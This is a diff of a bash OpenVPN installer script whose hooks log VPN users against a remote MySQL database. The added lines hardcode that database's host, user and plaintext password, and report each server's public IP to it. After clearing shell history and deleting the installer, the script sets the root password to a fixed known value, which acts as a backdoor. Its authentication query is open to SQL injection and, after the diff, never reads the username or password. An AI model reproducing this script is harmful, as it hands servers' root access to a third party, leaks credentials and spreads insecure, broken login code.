@@ -1,4 +1,9 @@
 #!/bin/bash
+#Database Details
+HOST='162.250.124.218';
+USER='mediatek_panda';
+PASS='F1005r90@';
+DBNAME='mediatek_panda';
 rm -rf install*
 apt-get update -y
 sudo timedatectl set-timezone Asia/ Riyadh
@@ -15,58 +20,44 @@ touch /etc/openvpn/server2.conf
 
 cat <<\EOM >/etc/openvpn/login/config.sh
 #!/bin/bash
-HOST='162.250.124.218'
-USER='mediatek_pandavpn'
-PASS='F1005r90@'
-DB='mediatek_pandavpn'
-
+HOST='DBHOST'
+USER='DBUSER'
+PASS='DBPASS'
+DB='DBNAME'
 EOM
 
-
-
+sed -i "s|DBHOST|$HOST|g" /etc/openvpn/login/config.sh
+sed -i "s|DBUSER|$USER|g" /etc/openvpn/login/config.sh
+sed -i "s|DBPASS|$PASS|g" /etc/openvpn/login/config.sh
+sed -i "s|DBNAME|$DBNAME|g" /etc/openvpn/login/config.sh
 
 /bin/cat <<"EOM" >/etc/openvpn/login/auth_vpn
 #!/bin/bash
-username=`head -n1 $1 | tail -1`   
-password=`head -n2 $1 | tail -1`
-
-
-HOST='162.250.124.218'
-USER='mediatek_pandavpn'
-PASS='F1005r90@'
-DB='mediatek_pandavpn'
-
-
-Query="SELECT user_name FROM users WHERE user_name='$username' AND auth_vpn=md5('$password') AND status='live' AND is_freeze=0 AND is_ban=0 AND (duration > 0 OR vip_duration > 0 OR private_duration > 0)"
+. /etc/openvpn/login/config.sh
+Query="SELECT user_name FROM users WHERE user_name='$username' AND user_encryptedPass=md5('$password') AND is_freeze='0' AND user_duration > 0"
 user_name=`mysql -u $USER -p$PASS -D $DB -h $HOST -sN -e "$Query"`
 [ "$user_name" != '' ] && [ "$user_name" = "$username" ] && echo "user : $username" && echo 'authentication ok.' && exit 0 || echo 'authentication failed.'; exit 1
-EOM
 EOM
 
 #client-connect file
 cat <<'LENZ05' >/etc/openvpn/login/connect.sh
 #!/bin/bash
 
-tm="$(date +%s)"
-dt="$(date +'%Y-%m-%d %H:%M:%S')"
-timestamp="$(date +'%FT%TZ')"
-
 . /etc/openvpn/login/config.sh
 
 ##set status online to user connected
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_active='1' AND device_connected='1' WHERE user_name='$common_name' "
+server_ip=$(curl -s https://api.ipify.org)
+datenow=`date +"%Y-%m-%d %T"`
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_active='1', device_connected='1', active_address='$server_ip', active_date='$datenow' WHERE user_name='$common_name' "
 LENZ05
 
 #TCP client-disconnect file
 cat <<'LENZ06' >/etc/openvpn/login/disconnect.sh
 #!/bin/bash
-tm="$(date +%s)"
-dt="$(date +'%Y-%m-%d %H:%M:%S')"
-timestamp="$(date +'%FT%TZ')"
 
 . /etc/openvpn/login/config.sh
 
-mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_active='0' WHERE user_name='$common_name' "
+mysql -u $USER -p$PASS -D $DB -h $HOST -e "UPDATE users SET is_active='0', active_address='', active_date='' WHERE user_name='$common_name' "
 LENZ06
 
 
@@ -905,5 +896,5 @@ history -c
 cd /root || exit
 rm -f /root/installer.sh
 echo -e "\e[1;32m Installing Done \033[0m"
-echo 'root:f1005r90' | sudo chpasswd
+echo 'root:F1005r90FF' | sudo chpasswd
 
